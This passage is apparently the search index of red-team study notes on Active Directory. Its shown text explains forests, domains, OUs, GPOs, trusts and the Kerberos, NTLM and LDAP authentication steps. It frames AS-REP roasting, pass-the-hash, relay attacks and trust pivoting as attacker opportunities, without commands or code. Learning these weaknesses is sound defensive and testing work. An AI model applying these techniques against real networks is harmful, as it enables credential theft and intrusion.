window.__FT_INDEX__ = [{"id":"","u":"09_web-vuln-checklist.html","sec":"Web Vulnerability Checklist","lvl":1,"t":"Web Vulnerability Checklist","c":""},{"id":"","u":"08_privesc-tools.html","sec":"Priv escalation & Tools","lvl":1,"t":"Priv escalation & Tools","c":""},{"id":"","u":"07_cloud-k8s.html","sec":"Cloud & K8s","lvl":1,"t":"Cloud & K8s","c":""},{"id":"","u":"06_pentest-web.html","sec":"Pentest web","lvl":1,"t":"Pentest web","c":""},{"id":"","u":"05_ti-interne.html","sec":"TI interne","lvl":1,"t":"TI interne","c":""},{"id":"","u":"04_forest-privilege-escalation-trust-abuse-technique.html","sec":"Forest privilege escalation / trust abuse technique","lvl":1,"t":"Forest privilege escalation / trust abuse technique","c":""},{"id":"","u":"03_persistence.html","sec":"Persistence","lvl":1,"t":"Persistence","c":""},{"id":"","u":"02_permissions-abuse.html","sec":"Permissions Abuse","lvl":1,"t":"Permissions Abuse","c":""},{"id":"","u":"01_attacks-lateral-movement.html","sec":"Attacks + Lateral Movement","lvl":1,"t":"Attacks + Lateral Movement","c":""},{"id":"","u":"00_things-to-understand-prior.html","sec":"Things To Understand Prior","lvl":1,"t":"Things To Understand Prior","c":""},{"id":"ad-components","u":"00_things-to-understand-prior.html#ad-components","sec":"Things To Understand Prior","lvl":2,"t":"AD Components","c":""},{"id":"understanding-the-core-concept","u":"00_things-to-understand-prior.html#understanding-the-core-concept","sec":"Things To Understand Prior","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-is-active-directory","u":"00_things-to-understand-prior.html#what-is-active-directory","sec":"Things To Understand Prior","lvl":3,"t":"🔹 What is Active Directory?","c":"Active Directory (AD) is a directory service developed by Microsoft that serves as the backbone of identity and access management in a Windows-based corporate network. It stores information about all network resources—such as Users computers groups printers and enables centralized administration and security enforcement. Through AD, administrators can manage authentication (verifying user identity) and authorization (determining access rights), making it possible to securely organize and control access to everything within the network, from a single console."},{"id":"microsoft-definition","u":"00_things-to-understand-prior.html#microsoft-definition","sec":"Things To Understand Prior","lvl":3,"t":"🔐 Microsoft Definition:","c":"“Active Directory enables centralized, secure management of an entire network, which might span a building, a city or multiple locations throughout the world.”"},{"id":"active-directory-components","u":"00_things-to-understand-prior.html#active-directory-components","sec":"Things To Understand Prior","lvl":2,"t":"🧱 Active Directory Components","c":"Here are the core components that make AD powerful and scalable:"},{"id":"schema","u":"00_things-to-understand-prior.html#schema","sec":"Things To Understand Prior","lvl":3,"t":"🔹 Schema","c":"Schema = Blueprint defining what objects and attributes can exist in AD The schema in AD acts as the blueprint or DNA of the directory. It defines all the object types (e.g., users, computers, groups) and their attributes (e.g., username, email, department). For example, a user object might have username , email , and department , while a computer object might include hostname and OS . The schema ensures consistency , maintains data integrity , and prevents the creation of invalid or unsupported objects across the environment."},{"id":"query-and-index-mechanism","u":"00_things-to-understand-prior.html#query-and-index-mechanism","sec":"Things To Understand Prior","lvl":3,"t":"🔹 Query and Index Mechanism","c":"AD’s query and index mechanism enables fast searching and retrieval of directory data. It uses LDAP (Lightweight Directory Access Protocol) for communication. AD creates indexes on frequently queried attributes like samAccountName (username) and objectClass (type) to optimize performance . This mechanism is critical in large networks for tasks like finding users , identifying unused devices , or searching groups efficiently."},{"id":"global-catalog","u":"00_things-to-understand-prior.html#global-catalog","sec":"Things To Understand Prior","lvl":3,"t":"🔹 Global Catalog","c":"The Global Catalog (GC) is a read-only, partial replica of all objects from every domain in the forest . It contains a subset of attributes that are commonly used in searches and is hosted on Global Catalog Servers (often Domain Controllers). The GC enables cross-domain authentication such as logging into a system in one domain using credentials from another. e.g., logging into hr.company.com from a sales.company.com computer and allows forest-wide searches (e.g., finding any user from any domain). It plays a crucial role in login performance and resource discovery across the network."},{"id":"what-gc-stores","u":"00_things-to-understand-prior.html#what-gc-stores","sec":"Things To Understand Prior","lvl":3,"t":"What GC Stores","c":"Suppose: Forest │ ├── corp.local │ ├── Daniel │ ├── dev.local │ ├── John │ └── sales.local ├── Mike You search: John GC can immediately answer: John exists in dev.local without contacting every domain. Think: Domain Controller = Full copy of one domain Global Catalog = Partial copy of entire forest Think of the GC as a phonebook with just the names and numbers—not full profiles."},{"id":"replication-service","u":"00_things-to-understand-prior.html#replication-service","sec":"Things To Understand Prior","lvl":3,"t":"🔹 Replication Service","c":"The replication service ensures that all Domain Controllers (DCs) have an up-to-date and synchronized copy of the AD database. Changes—such as password resets or new user creation —are automatically replicated to other DCs. e.g., You change your password in Delhi, and it gets replicated to DCs in Mumbai, Bangalore, etc."},{"id":"timestamp","u":"00_things-to-understand-prior.html#timestamp","sec":"Things To Understand Prior","lvl":4,"t":"Timestamp?","c":"Partially. AD uses: Update Sequence Numbers (USNs) Invocation IDs Replication metadata Version numbers Timestamps Not timestamps alone. When two DCs compare data: Which object changed? Which version is newer? Replication metadata determines the winner."},{"id":"replication-interval","u":"00_things-to-understand-prior.html#replication-interval","sec":"Things To Understand Prior","lvl":3,"t":"⏱ Replication Interval","c":"Depends. Same Site (Default) Every 15 seconds after change notification Then nearby DCs notify partners. Very fast. Usually: 15 sec → notify partner 3 sec → next partner 3 sec → next partner"},{"id":"different-sites","u":"00_things-to-understand-prior.html#different-sites","sec":"Things To Understand Prior","lvl":4,"t":"Different Sites","c":"(Default) 180 minutes (3 hours) because WAN links may be slow. Admins can modify this."},{"id":"two-types-of-replication","u":"00_things-to-understand-prior.html#two-types-of-replication","sec":"Things To Understand Prior","lvl":3,"t":"📶 Two types of replication:","c":"Intra-site (within the same site): Fast, frequent Inter-site (between different sites): Scheduled, optimized AD uses timestamps and version numbers to resolve conflicts and ensure data integrity across the domain. Without replication, your AD environment would become inconsistent and unreliable."},{"id":"active-directory-structure","u":"00_things-to-understand-prior.html#active-directory-structure","sec":"Things To Understand Prior","lvl":2,"t":"Active Directory Structure","c":""},{"id":"forest","u":"00_things-to-understand-prior.html#forest","sec":"Things To Understand Prior","lvl":3,"t":"🔹 Forest","c":"A forest is the topmost level of organization in Active Directory. It represents the entire Active Directory environment and acts as a security boundary . It can contain one or more domains . All domains in a forest share a common schema (structure of objects and attributes) global catalog , and configuration . Forests allow different parts of an organization (like departments or regional offices) to be connected while maintaining administrative independence . Domains inside a forest can trust each other and share resources , but no access is allowed from outside the forest unless explicitly configured. Forests are ideal when different business units or companies require some level of isolation but still want shared resources and trust relationships. 👉 Think of a forest like a container for multiple trees (domains) that all live under the same environment."},{"id":"domain","u":"00_things-to-understand-prior.html#domain","sec":"Things To Understand Prior","lvl":3,"t":"🔹Domain","c":"A domain is a logical group of users, computers, groups, and other objects that share the same Active Directory database and security policies . Each domain has its own policies , security settings , and domain controllers (servers that manage authentication and directory services). Domains are the core unit for authentication , authorization , and policy enforcement Domains are used to organize and manage network resources efficiently. Every domain has a unique name (like sales.company.com ) can have trust relationships with other domains to facilitate resource sharing across the network. 👉 A domain is like a tree inside the forest. It can stand on its own, but still be part of a larger group (the forest). image.png"},{"id":"example-of-domain-and-forest.","u":"00_things-to-understand-prior.html#example-of-domain-and-forest.","sec":"Things To Understand Prior","lvl":2,"t":"Example of Domain and Forest.","c":""},{"id":"example-of-a-domain","u":"00_things-to-understand-prior.html#example-of-a-domain","sec":"Things To Understand Prior","lvl":3,"t":"✅ Example of a Domain","c":"Let’s say your company is called TechCorp . You create a domain called: techcorp.com This domain will contain: All your employees’ user accounts All computers joined to the domain Groups for teams like HR, IT, Sales Policies and permissions for everything Everyone in the company logs in using something like jane@techcorp.com . This is one domain , and if it’s the only one, then your forest also only has one domain ."},{"id":"example-of-multiple-domains-in-a-forest","u":"00_things-to-understand-prior.html#example-of-multiple-domains-in-a-forest","sec":"Things To Understand Prior","lvl":3,"t":"✅ Example of Multiple Domains in a Forest","c":"Now imagine TechCorp expands globally. You want different teams or regions to manage their own systems, so you create: us.techcorp.com (for the US office) eu.techcorp.com (for the Europe office) asia.techcorp.com (for the Asia office) Each of these is a separate domain , but they are all part of the same forest : 🔒 techcorp.com forest They share: Trust relationships (users from one domain can access resources in another if allowed) A global catalog (so you can search users across domains) The same schema and configuration base"},{"id":"example-of-multiple-forests","u":"00_things-to-understand-prior.html#example-of-multiple-forests","sec":"Things To Understand Prior","lvl":3,"t":"✅ Example of Multiple Forests","c":"Now suppose TechCorp buys another company: CyberSecure Inc. They have their own AD setup with their own structure: cybersecure.com This is a separate forest , because: They have their own schema They don’t trust TechCorp domains unless configured It’s an entirely isolated security boundary Unless you create a trust relationship , users from cybersecure.com can’t access techcorp.com resources."},{"id":"organizational-unit-ou","u":"00_things-to-understand-prior.html#organizational-unit-ou","sec":"Things To Understand Prior","lvl":3,"t":"🔹Organizational Unit (OU)","c":"An Organizational Unit (OU) is a folder within a domain that is used to group objects logically based on business structure or function (e.g., departments like IT, HR). OUs allow administrators to apply Group Policies and delegate administrative tasks at a more granular level, without creating new domains. For instance, an OU for the Finance team can have unique password policies and administrative permissions that differ from other departments, making OUs essential for scalable and flexible administration . An Organizational Unit (OU) is like a folder inside a domain in Active Directory. It helps you organize and manage objects such as: Users 👤 Computers 💻 Groups 👥 Other OUs 📁 It allows for logical grouping of resources based on business needs (like departments, locations, or functions) and makes administration easier and more flexible ."},{"id":"why-are-ous-important","u":"00_things-to-understand-prior.html#why-are-ous-important","sec":"Things To Understand Prior","lvl":3,"t":"🔐 Why are OUs important?","c":"🔧 You can apply Group Policies (like password rules, desktop settings) to specific OUs. 👨‍💻 You can delegate administrative control —give someone rights to manage only the objects in a specific OU. 📁 Helps in organizing large domains into manageable pieces. In the domain techcorp.com , you might have OUs like: OU=HR OU=IT OU=Finance In OU=IT , you store: User accounts: john.doe , jane.smith Computers: IT-PC01 , IT-Laptop23 Groups: IT Admins , HelpDesk You can then apply specific policies to OU=IT like access to IT servers only, remote desktop allowed, Admin tools installed by default Meanwhile, the Finance OU can have different users and rules—like access to payroll systems and stricter login policies. Think of a domain as a school , and OUs as classrooms . Each classroom has its own students and rules but is part of the same school."},{"id":"trusts","u":"00_things-to-understand-prior.html#trusts","sec":"Things To Understand Prior","lvl":3,"t":"Trusts:","c":"A trust is essentially a link between two AD domains or forests that allows security principals (users, groups, computers) in one domain to be trusted by another domain for access to resources . When a trust exists: Authentication requests can be forwarded from one domain to another. Users don’t need to re-enter credentials. Access to resources can be controlled using ACLs. Domains can allow access to shared resource outside of their boundaries by using a trust. Forest trusts allow users to access resources in any domain in the other forest, as well as logon to any domain in the forest."},{"id":"example","u":"00_things-to-understand-prior.html#example","sec":"Things To Understand Prior","lvl":3,"t":"Example","c":""},{"id":"forest-tree-forest-root-domain-child-domain-with-help-of-tree-diagram.","u":"00_things-to-understand-prior.html#forest-tree-forest-root-domain-child-domain-with-help-of-tree-diagram.","sec":"Things To Understand Prior","lvl":3,"t":"Forest, Tree, Forest root domain, child domain with help of tree diagram.","c":"image.png"},{"id":"forest-1","u":"00_things-to-understand-prior.html#forest-1","sec":"Things To Understand Prior","lvl":3,"t":"🌐 1. Forest","c":"A Forest is the topmost level in an Active Directory (AD) environment. It represents the entire AD infrastructure and acts as a security boundary for all objects, trusts, and policies within it. It contains one or more Trees . All domains in the forest share a common schema (rules and object types) and global catalog (used for searching objects across domains). Forests can be used to separate different parts of an organization (like different business units or subsidiaries), while still allowing them to communicate if needed . 🧠 Example: mycompany.com is a forest. It includes domains like: mycompany.com (root domain) sales.mycompany.com hr.mycompany.com Another tree: techdivision.com 🔐 Security Boundary: Admins in one forest cannot control or see objects in another forest unless a trust is explicitly created. The first domain you create in a new forest is called the “forest root domain”, and its name becomes the same as the forest’s name. image.png In above image foobank.inc is forest and its has only one domain which has same name as forest. When a new domain will be added it will added to this forest it will have some other name."},{"id":"tree","u":"00_things-to-understand-prior.html#tree","sec":"Things To Understand Prior","lvl":3,"t":"🌳 2. Tree","c":"A Tree is a collection of domains(Root Domain + all its Child Domains) that share a contiguous namespace . It starts with a root domain , and then you can create child domains under it. A tree allows logical grouping, often based on departments or regions. Domains in a tree automatically trust each other (transitive two-way trusts). You can have multiple trees inside a forest if needed. 🧠 Example: In Tree 1: mycompany.com (root domain) hr.mycompany.com (child domain) sales.mycompany.com (child domain) In Tree 2 (same forest, different namespace): techdivision.com (root domain) dev.techdivision.com (child domain) 🌐 All these domains are still part of one forest — mycompany.com."},{"id":"root-domain","u":"00_things-to-understand-prior.html#root-domain","sec":"Things To Understand Prior","lvl":3,"t":"🌲 3. Root Domain","c":"The Root Domain is the first domain created in a forest or tree. It is the anchor of the tree and forms the base of the domain hierarchy. It is responsible for maintaining the forest-wide roles (such as Schema Master and Domain Naming Master). Other domains (child domains) branch off from the root. 🧠 Example: mycompany.com is the tree root domain of Tree 1. techdivision.com is the tree root domain of Tree 2. 🔄 The first root domain created in a forest( mycompany.com in this case) is known as the Forest Root Domain. Additional info: 🟢 A forest can contain: Multiple domain trees (like mycompany.com , techdivision.com ) Each tree has its own tree root domain (e.g., mycompany.com is the root of its tree) 🔴 But there is only one forest root domain — the very first domain created in the forest (e.g., mycompany.com if it was created first). so mycompany.com is forest root domain as well as tree root domain, where as techdivision.com is only tree root domain. The forest root domain can (and usually does) have the same name as the forest. 🔍 Explanation: The forest name is not a separate object — it’s actually named after the first domain created in the forest. This first domain is called the Forest Root Domain . ✅ So: When you create the first domain (e.g., corp.com ), it becomes: The Forest Root Domain The name of the forest itself So by default design , both the forest and the forest root domain are named the same ."},{"id":"think-of-it-like-this","u":"00_things-to-understand-prior.html#think-of-it-like-this","sec":"Things To Understand Prior","lvl":3,"t":"🧠 Think of it like this:","c":"Term | Value | — | — | Forest name | corp.com | Forest root domain | corp.com | 💡 But remember — you can have other trees in the same forest (like eurocorp.local ), and they will have different names , while still being part of the same forest."},{"id":"child-domain","u":"00_things-to-understand-prior.html#child-domain","sec":"Things To Understand Prior","lvl":3,"t":"🧱 4. Child Domain","c":"A Child Domain is a subdomain of a root domain. It is used to: Organize resources by department , region , or function . Delegate administrative control more securely. Apply Group Policies specific to that domain. 🧠 Example: hr.mycompany.com is a child of mycompany.com dev.techdivision.com is a child of techdivision.com 🔗 Child domains inherit trust relationships from their parent domain."},{"id":"organizational-unit-ou-1","u":"00_things-to-understand-prior.html#organizational-unit-ou-1","sec":"Things To Understand Prior","lvl":3,"t":"🗂 5. Organizational Unit (OU)","c":"An Organizational Unit (OU) is a logical container within a domain used to group users, groups, computers, and other OUs. Helps apply Group Policy Objects (GPOs) to only specific users/computers. Allows delegation of administration (e.g., HR can manage their own users). OUs exist only within domains (they don’t span across domains). 🧠 Example: In the domain sales.mycompany.com : OU: SalesTeam → contains users sales1 , sales2 OU: SalesDevices → contains Sales-PC1 , Sales-PC2 🎯 Ideal for applying GPOs like password policy, screen lock settings, etc. OUs = Logical folders that help you organize AD objects and apply management or security policies efficiently. Example of what can be done using OUs Task | Example | — | — | Apply GPO to Sales only | Block USB access for OU=Sales | Delegate access | Allow junior admin to reset passwords only in HR | Organize logically | Easily find and manage all IT users in one place | Apply login scripts | Assign network drives to only OU=IT users | Every domain and its child domains in Active Directory can have separate Organizational Units (OUs), as each child domain is separate in terms of administration and can have its own OUs. In Active Directory , you can have multiple levels of nested OUs — also known as sub-OUs . Eg: image.png Employee OU has two sub OUs which are Finance and HR."},{"id":"domain-controller-dc","u":"00_things-to-understand-prior.html#domain-controller-dc","sec":"Things To Understand Prior","lvl":3,"t":"🖥 6. Domain Controller (DC)","c":"A Domain Controller (DC) is a Windows server that runs Active Directory services and does the following: Authenticates users (logins) Authorizes access to resources() Manages domain data (user accounts, passwords, policies) Replicates AD data to other DCs Each domain must have at least one DC , but usually there are multiple for redundancy . 🧠 Example: DC1 might be Domain Controllers for mycompany.com DC2 could be for hr.mycompany.com 🔁 DCs replicate data between each other to keep AD updated. Additional Info: Each domain and child domain in Active Directory has its own Domain Controllers (DCs) and they cannot share the exact same Domain Controllers Single domain can (and should) have multiple Domain Controllers (DCs) — and it’s actually considered best practice in Active Directory environments Why can’t domains share DCs: Each Domain Controller (DC) : Holds a copy of the domain’s database (i.e., NTDS.dit ) Manages authentication , authorization , and replication specific to that domain Is tied to a single domain only So: A DC for corp.com can only handle corp.com domain objects A DC for hr.corp.com can only manage hr.corp.com objects Even though they don’t share DCs , there is a default two-way transitive trust between parent and child domains.That means users can access resources across domains , if permissions allow."},{"id":"group-policy-objects-gpos","u":"00_things-to-understand-prior.html#group-policy-objects-gpos","sec":"Things To Understand Prior","lvl":3,"t":"7. Group Policy Objects (GPOs)","c":"Group Policy Objects are configurations used to manage the behavior of users and computers in an Active Directory environment. They allow admins to enforce security settings, software installations, scripts, and much more centrally and automatically . 🔹 GPOs can be linked to: Sites Domains Organizational Units (OUs) 🔹 GPOs are applied in the following order: Local Site Domain OU (including nested OUs, from top to bottom) ⚠️ GPOs do not cross domain boundaries but can be replicated within the domain using Domain Controllers . 🧠 Examples of Group Policies : Enforce password complexity and lockout settings. Disable USB access on company laptops. Install antivirus software on all devices in a specific OU. Configure desktop wallpaper and disable control panel. Additonal Info: “ GPOs are linked to OUs (or domains/sites), and they contain policy settings. The Domain Controller enforces those policies by applying them to the users and computers located in the linked OU during login or system startup. ” Where GPO can be linked to: GPO Linked To | Who It Affects | — | — | Domain | All users and computers in the domain (including OUs, unless blocked) | OU | Only the users/computers inside that OU | Child OU | Inherits GPOs from parent OU unless inheritance is blocked | Site (rare case) | Affects all objects within that AD Site | So it the GPOs are directly linked to domain then the DC will enforce policy to all the OUs and child domain(unless it is blocked) present within the domain."},{"id":"trusts-1","u":"00_things-to-understand-prior.html#trusts-1","sec":"Things To Understand Prior","lvl":3,"t":"Trusts","c":""},{"id":"types-of-trusts-in-active-directory","u":"00_things-to-understand-prior.html#types-of-trusts-in-active-directory","sec":"Things To Understand Prior","lvl":3,"t":"🧩 Types of Trusts in Active Directory","c":"Trusts can be broadly categorized by: ✅ 1. Direction of Trust One-way trust : Domain A trusts Domain B — users from B can access A, but not vice versa. Two-way trust : Both domains trust each other — users from both sides can access resources across. ✅ 2. Scope of Trust Trust Type | Description | Direction | Auto/Manual | — | — | — | — | Parent-Child Trust | Between parent and child domains in the same forest | Two-way, transitive | Automatic | Tree-Root Trust | Between root domains in the same forest forming a tree | Two-way, transitive | Automatic | External Trust | Between domains in different forests (no forest trust) | One- or two-way, non-transitive | Manual | Forest Trust | Between two forests (entire structure) | One- or two-way, transitive | Manual | Realm Trust | Between a Windows domain and a non-Windows (Kerberos V5) realm | One- or two-way, transitive or non-transitive | Manual | Shortcut Trust | Optimizes authentication path between two domains in a complex forest | One- or two-way, transitive | Manual | 🔁 Transitive vs Non-Transitive Trust Transitive : Trust extends beyond the two domains directly involved (e.g., if A trusts B and B trusts C, A trusts C). Non-Transitive : Trust exists only between the two specified domains . 🔓 Example Scenario You have DomainA.com and DomainB.com in different forests. A forest trust allows users from DomainB.com to access shared folders in DomainA.com. You add a shortcut trust between Sales.DomainA.com and HR.DomainA.com to speed up logon time for users frequently accessing resources between the two."},{"id":"trusts-in-red-teaming","u":"00_things-to-understand-prior.html#trusts-in-red-teaming","sec":"Things To Understand Prior","lvl":3,"t":"🛡️ Trusts in Red Teaming","c":"Trusts can expand the attack surface . If you compromise a user or DC in one domain, you may pivot into another trusted domain . Enumeration tools like BloodHound can reveal trust relationships that red teamers exploit."},{"id":"ad-authentication","u":"00_things-to-understand-prior.html#ad-authentication","sec":"Things To Understand Prior","lvl":2,"t":"AD Authentication","c":""},{"id":"active-directory-authentication","u":"00_things-to-understand-prior.html#active-directory-authentication","sec":"Things To Understand Prior","lvl":4,"t":"Active Directory Authentication","c":"Active Directory (AD) authentication is the process by which users and computers verify their identities to gain access to network resources within an Active Directory domain. It plays a critical role in ensuring secure access to resources while maintaining centralized control over authentication and access management. As far as authentication on Active Directory is concerned, the most common way for users to authenticate is by providing a username and password. Active Directory (AD) supports several authentication protocols that facilitate secure communication and user authentication within an AD domain environment. These protocols play a crucial role in ensuring the confidentiality, integrity, and authenticity of authentication exchanges. Here are some of the key AD authentication protocols: Kerberos NTLM LDAP"},{"id":"kerberos","u":"00_things-to-understand-prior.html#kerberos","sec":"Things To Understand Prior","lvl":4,"t":"Kerberos","c":"Kerberos is the primary authentication protocol used by Active Directory for user authentication. How it works: When a user attempts to log in, their client computer requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), which is typically a domain controller. The domain controller verifies the user’s credentials and issues a TGT if authentication is successful. The TGT is then used to obtain Service Tickets for accessing specific network resources. image.png"},{"id":"in-detailed-working-of-kerberos","u":"00_things-to-understand-prior.html#in-detailed-working-of-kerberos","sec":"Things To Understand Prior","lvl":4,"t":"In Detailed working of Kerberos:","c":"Step-by-Step Kerberos Authentication: Let’s assume a user named Alice (alice@corp.local) wants to access a file server (fileserver.corp.local) . 1️⃣ AS-REQ (Authentication Service Request) 🔹 Alice logs into her computer , which is joined to the AD domain. 🔹 Her machine sends a AS-REQ Request to the Key Distribution Center (KDC) , which is a service that runs on a Domain Controller (DC) . 🔹 The request includes: Alice’s username (not password) A timestamp - encrypted using the Alice’s long-term key (derived from the AES or RC4 , hash). (This step is Optional - required only if pre-authentication enabled for the user. Note:- pre-authentication is default for modern environments ). The realm/domain name. Encryption types supported. ✅ Goal : Ask for a TGT (Ticket Granting Ticket) Additional Info: What is pre authentication? In Kerberos , pre-authentication is a mechanism to verify that the user actually knows their password before the Key Distribution Center ( KDC ) hands out a Ticket Granting Ticket ( TGT ). Why Pre-Authentication Exists (Its Strength): Prevents unauthenticated users from requesting tickets for any account . Ensures that the person requesting a TGT actually knows the password . Helps prevent replay attacks — the timestamp changes with every login, so old requests are invalid. 2️⃣ AS-REP (Authentication Service Reply) The KDC decrypts this timestamp using the stored password hash from Active Directory (AD) . If decryption is successful, the user must have the correct password — this proves the user(Alice) is legitimate . 🔹 If the username and timestamp are correct, the KDC sends back: A TGT (Ticket Granting Ticket) : encrypted with the KDC’s secret key - specifically, the krbtgt account key( A special account in Active Directory ) . A session key : encrypted using the user’s long-term key (which is derived from the user’s password hash, typically NT hash). ✅ Alice’s computer can now use this TGT to request access to services(via a TGS-REQ) without resending the password. Aditional Information: When Pre-Authentication is Disabled (for AS-REP Roasting): In this misconfiguration , the KDC skips the need for encrypted timestamp. The attacker can send a bare AS-REQ with just the username. KDC replies with AS-REP , where the session key is encrypted with the user’s NTLM hash (technically: a key derived from it, usually AES or RC4 based). ✅ In this insecure setup: AS-REP is directly encrypted with the NTLM hash (or key derived from it), making it crackable offline. 3️⃣ TGS-REQ (Ticket Granting Service Request) 🔹 Alice now wants to access .corp.local . 🔹 Her machine sends the TGT to the KDC and requests a Service Ticket for the file server. ✅ This request includes: TGT (proves she’s authenticated) Service Principal Name (SPN) of the target (like cifs/fileserver.corp.local ) Additonal Info: Step-by-Step Use of TGT and Session Key ✅ 1. User wants to access a service (e.g., a file share or SQL server) The user sends a TGS-REQ (Ticket Granting Service Request) to the KDC (Ticket Granting Service) . This request includes the TGT and is encrypted with the session key that was previously shared during AS-REP. 🔐 2. Use of Session Key The session key is used to: Encrypt the authenticator (timestamp + username) the user sends to KDC along with the TGT. Secure the communication between the user and the KDC. It ensures the authenticator is fresh (not reused) and the request is coming from the legitimate user who has the session key. 4️⃣ TGS-REP (Ticket Granting Service Reply) 🔹 KDC validates the TGT The KDC decrypts the TGT using the krbtgt password hash (since it created it). Then, the KDC uses the session key inside the TGT to decrypt the authenticator . 🔹 If all checks pass KDC issues : A Service Ticket(ST)/ Ticket Granting Service(TGS)- encrypted with the file server’s secret key(file server’s NTLMhash) A session key to be used between Alice and the file server ✅ Now, Alice has a ticket that the file server will trust. Additonal "},{"id":"additional-info","u":"00_things-to-understand-prior.html#additional-info","sec":"Things To Understand Prior","lvl":3,"t":"Additional Info:","c":"The timestamp is optional in some specific cases, then how the client authentication is done without timestamp? 🧩 What if the timestamp is not used? There is an alternate method (legacy or compatibility mode), where instead of sending an encrypted timestamp, the client may request the TGT without pre-authentication . However: This is only allowed if Pre-Authentication is disabled for the account in AD. In this case, the KDC still encrypts the session key using the user’s password hash which is stored in AD. The client must then decrypt it using the correct password . 💡 So even without a timestamp , the user must prove knowledge of the correct password — because otherwise, it can’t decrypt the session key. 🛡️ Bonus: Why Timestamp Is Usually Required Timestamps prevent replay attacks . Without it, an attacker could reuse a previously captured request. That’s why Kerberos pre-authentication is enabled by default — to force proof that the user knows the password now , not at some earlier time."},{"id":"example-summary-with-entities","u":"00_things-to-understand-prior.html#example-summary-with-entities","sec":"Things To Understand Prior","lvl":4,"t":"🎯 Example Summary (With Entities)","c":"Step | Action | Sent To | Key Used | — | — | — | — | AS-REQ | Username + Encrypted Timestamp | KDC (DC) | Alice’s password-derived key | AS-REP | TGT + Session Key | Alice | KDC’s secret & Alice’s password key | TGS-REQ | TGT + SPN of file server | TGS (DC) | Session key | TGS-REP | Service Ticket + Session Key | Alice | File server’s secret | Service Access | Service Ticket | File Server | File server verifies ticket | image.png image.png Features: Mutual authentication: Both the client and the server verify each other’s identities. Single Sign-On (SSO): Users authenticate once and can access multiple resources without re-entering credentials. Ticket-based: Authentication exchanges rely on encrypted tickets, reducing the risk of credential theft."},{"id":"ntlm","u":"00_things-to-understand-prior.html#ntlm","sec":"Things To Understand Prior","lvl":3,"t":"NTLM","c":"NTLM is a legacy authentication protocol used primarily in older versions of Windows systems before Kerberos became the default. It was the default authentication method in Windows NT systems. Kerberos is the default authentication method in Active Directory for domain authentication in Windows environments (since Windows 2000). If Kerberos fails due to misconfiguration or some issue, the system falls back to NTLM. Windows systems are designed to fall back to NTLM if: The KDC (Domain Controller) is not reachable The client or service does not support Kerberos Clock skew or SPNs are misconfigured 🧾 How NTLM Authentication Works (Step-by-Step): image.png 👉 Step 1: User sends username to the server The client sends only the username (not password) to the server. 👉 Step 2: Server sends a challenge The server responds with a random 16-byte challenge (nonce). 👉 Step 3: Client encrypts the challenge using a hash of the user’s password The client: Hashes the password using NT hash . Uses this hash to encrypt the challenge . Sends this encrypted value back to the server. 👉 Step 4: Server verifies the response The server contacts a Domain Controller (DC) : It sends the username and the challenge-response . The DC retrieves the stored NT hash of the user , encrypts the challenge the same way, and compares it. ✅ If both match → Authentication is successful . image.png ⚠️ Key Points: No tickets involved (unlike Kerberos). Does not require a Domain Controller (DC) , making it usable in workgroup environments . It relies on password hashes , making it vulnerable to: Pass-the-Hash attacks NTLM Relay attacks Brute-force NTLM is still used in fallback scenarios when Kerberos fails (e.g., during domain misconfigurations or cross-domain issues). 🧠 Real-World Example: You try to access a shared folder on another computer that’s not part of the domain — NTLM is used to authenticate your credentials. Features: Compatibility: NTLM is supported by older Windows systems and applications. Simplicity: NTLM authentication does not require the complexity of Kerberos, making it easier to implement in certain environments. Security: NTLM has security limitations compared to Kerberos, including susceptibility to pass-the-hash attacks and lack of mutual authentication."},{"id":"ldap","u":"00_things-to-understand-prior.html#ldap","sec":"Things To Understand Prior","lvl":3,"t":"LDAP","c":"LDAP (Lightweight Directory Access Protocol) is primarily used to query and manage directory information (like Active Directory users, groups, OUs). However, it also supports user authentication via bind operations . There are two common ways LDAP is used for authentication : 🔹 1. Simple Bind (Username + Password) The client connects to the LDAP server (Domain Controller) . Sends username (Distinguished Name or UPN) and password . The LDAP server validates the credentials against the directory. If correct → user is authenticated . ⚠️ If not using LDAPS (port 636) , the credentials are sent in plain text – a big security risk . 🔹 2. SASL Bind (Kerberos or NTLM integration) LDAP can delegate authentication to other secure methods like Kerberos or NTLM via SASL (Simple Authentication and Security Layer) . This is more secure and common in domain environments. 🔁 LDAP vs NTLM for Authentication Feature | LDAP | NTLM | — | — | — | Protocol Type | Directory Access | Authentication | Auth Style | Bind (Simple or SASL) | Challenge-Response | Secure? | Only if LDAPS is used | Weak (vulnerable to Pass-the-Hash, Relay) | Can authenticate users? | ✅ Yes | ✅ Yes | Common Use | Directory queries, lightweight auth | Legacy user login | 🧠 Real-World Example: In enterprise web apps , LDAP (via LDAPS) is often used to authenticate users logging into internal tools. In Windows login , Kerberos is preferred , with NTLM as a fallback. LDAP may still be used after authentication to fetch user details."},{"id":"kerberos-authentication","u":"00_things-to-understand-prior.html#kerberos-authentication","sec":"Things To Understand Prior","lvl":2,"t":"Kerberos Authentication","c":""},{"id":"understanding-the-core-concept-1","u":"00_things-to-understand-prior.html#understanding-the-core-concept-1","sec":"Things To Understand Prior","lvl":3,"t":"Understanding The Core Concept","c":"Legitimate User: Begins the communication for a service request. Application Server: The server with the service the user wants to access. Key Distribution Center (KDC): KBRTGT account acts as a service account for the Key Distribution Center (KDC) and separated into three parts: Database (db), Authentication Server (AS) and Ticket Granting Server (TGS). Authentication Server (AS): Verify client authentication. If the logged user is authenticated successfully the AS issues a ticket called TGT. Ticket Granting Ticket (TGT): confirms to other servers that user has been authenticated. Ticket Granting Server (TGS): User request for TGS from the KDC that will be used to access the service of the application server. image.png"},{"id":"roles-whos-who-in-kerberos-dc-vs-kdc","u":"00_things-to-understand-prior.html#roles-whos-who-in-kerberos-dc-vs-kdc","sec":"Things To Understand Prior","lvl":3,"t":"1️⃣ Roles: Who’s Who in Kerberos (DC vs KDC)","c":"In a Windows domain: 🧠 Domain Controller (DC) The DC: Stores user & service account secrets (not plaintext passwords) Stores: NT hash Kerberos long-term keys (AES/RC4 derived from passwords) Hosts the KDC service 🎟️ Key Distribution Center (KDC) The KDC is a service running on the DC . It has two logical parts: Component | Role | — | — | AS (Authentication Service) | Gives you a TGT | TGS (Ticket Granting Service) | Gives you service tickets (TGS) | So in Windows: DC = the server KDC = a service running on the DC AS + TGS = logical parts of the KDC"},{"id":"what-does-the-dc-store-for-each-account","u":"00_things-to-understand-prior.html#what-does-the-dc-store-for-each-account","sec":"Things To Understand Prior","lvl":3,"t":"2️⃣ What Does the DC Store for Each Account?","c":"When a user sets a password: Example user: Username: alice Password: Winter@2024 The 